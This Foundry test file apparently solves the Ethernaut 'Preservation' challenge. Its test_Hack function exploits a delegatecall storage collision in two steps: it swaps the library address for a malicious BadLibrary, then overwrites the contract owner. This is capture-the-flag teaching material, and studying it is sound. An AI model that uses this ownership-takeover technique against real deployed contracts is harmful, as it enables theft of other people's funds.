// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Preservation, LibraryContract} from "../src/preservation/Preservation.sol";
import {BadLibrary} from "../src/preservation/BadLibrary.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract PreservationTest is Test {
    Preservation public sc;
    LibraryContract _lib1;
    LibraryContract _lib2;
    BadLibrary _badLibrary;

    function setUp() public {
        _lib1 = new LibraryContract();
        _lib2 = new LibraryContract();
        _badLibrary = new BadLibrary();

        sc = new Preservation(address(_lib1), address(_lib2));
        assertEq(sc.owner(), address(this));
    }

    function test_Hack() public {
        // normal play
        // approve
        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        // change library address
        sc.setFirstTime(uint160(address(_badLibrary)));
        assertEq(sc.timeZone1Library(), address(_badLibrary));
        // change owner
        sc.setFirstTime(uint160(account.ACC_0));
        assertEq(sc.owner(), account.ACC_0);
    }

}
